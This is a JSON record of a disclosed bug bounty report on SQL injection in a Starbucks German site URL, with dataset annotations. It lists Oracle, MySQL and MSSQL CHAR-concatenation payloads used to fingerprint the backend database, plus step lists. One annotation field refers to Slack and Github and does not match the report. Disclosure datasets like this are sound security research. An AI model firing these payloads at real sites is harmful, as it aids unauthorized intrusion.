{
  "reported_to": "Starbucks",
  "reported_by": "gbadebo ",
  "title": "SQL Injection Proof of Concept for Starbucks URL",
  "content": "\nbrowser: firefox quantum 60.0.1 64 bit\nos: windows 10\nsqli type: char formula injection\ninfo found: oracle database system\nurl: https://www.starbucks.de/coffee/our-coffees/format/whole-bean\ninjected url using oracle concatenation and char functions: https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)\nsteps to find oracle dbms\ninject the following url with order by 1 written with char and oracle concatenation resulting in an erronous page, which indicates oracle db is used.\nhttps://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49) 3.then inject the following url with mysql char using order by 1, which results in no error. so is not mysql dbms.\nhttps://www.starbucks.de/coffee/our-coffees/format/whole-beanCHAR(111, 114, 100, 101, 114, 32, 98, 121, 32, 49)\nfinally try and inject with microsoft sql server char injection using order by 1 in char concatenation. which results in no error. so is not a microsoft sql server database.\nhttps://www.starbucks.de/coffee/our-coffees/format/whole-bean CHAR(111) + CHAR(114) + CHAR(100) + CHAR(101) + CHAR(114) + CHAR(32) + CHAR(98) + CHAR(121) + CHAR(32) + CHAR(49) description: by process of elimination by error. i was able to figure out which database starbucks is using for that url. basically, the only sql injection code that errored was the oracle char concatenation. leading me to believe that you use oracle dbms.\nimages included attached showing error with oracle sql injection and no error with ms sql nor mysql injection,\nImpact\nby knowning that the database is oracle this can lead to furthder exploits to gain priviledged information as it is no longer a blind sql exploit. which is a lot easier to deploy. the attacker can now streamline the sql injection to be specifically based on oracle sql syntax.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1547077740,
  "report_url": "https://hackerone.com/reports/360539",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the target URL: https://www.starbucks.de/coffee/our-coffees/format/whole-bean"
    ],
    [
      2,
      "Inject the URL with Oracle concatenation and CHAR functions to test for SQL injection: https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)"
    ],
    [
      3,
      "Observe the error response, indicating Oracle DBMS is used"
    ],
    [
      4,
      "Repeat the injection with MySQL and MS SQL Server CHAR functions to confirm no errors, ruling out these DBMS"
    ]
  ],
  "vuln_description": "This vulnerability involves a SQL injection in the Starbucks URL that reveals the use of an Oracle database. By injecting specific CHAR concatenation syntax, the attacker can determine the database type, which simplifies further exploitation.",
  "reason": "The attack involves straightforward SQL injection techniques and does not require complex interactions or state manipulations. The process of elimination to identify the database type is a common and well-documented method.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "since Slack and Github are independent applications, none of the steps would apply since they deal with user_session/user_ids scoped to the same application",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The SQL injection described uses standard Oracle concatenation operators (||) and CHAR() functions without custom filter bypasses. The methodology's 'simple payload' definition includes basic DBMS-specific function permutations. Error detection occurs through direct HTTP response analysis (same channel), meeting the methodology's requirements. The payload complexity matches the described 'simple' category as it uses fundamental SQL syntax rather than advanced obfuscation.",
    "is_simple_injection": true
  }
}